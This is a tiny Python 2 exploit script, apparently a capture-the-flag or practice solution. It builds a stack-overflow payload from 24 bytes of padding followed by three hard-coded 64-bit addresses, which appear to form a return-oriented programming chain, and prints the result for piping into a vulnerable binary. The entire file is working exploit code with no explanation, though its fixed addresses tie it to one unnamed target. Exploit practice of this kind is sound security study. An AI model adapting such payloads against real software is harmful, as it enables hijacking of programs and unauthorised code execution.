#!/usr/bin/python
from struct import pack

payload = 'A'*24
payload += pack('<Q', 0x00000000004015bb)
payload += pack('<Q', 0x0000000000487b68)
payload += pack('<Q', 0x0000000000400f8e)

print payload
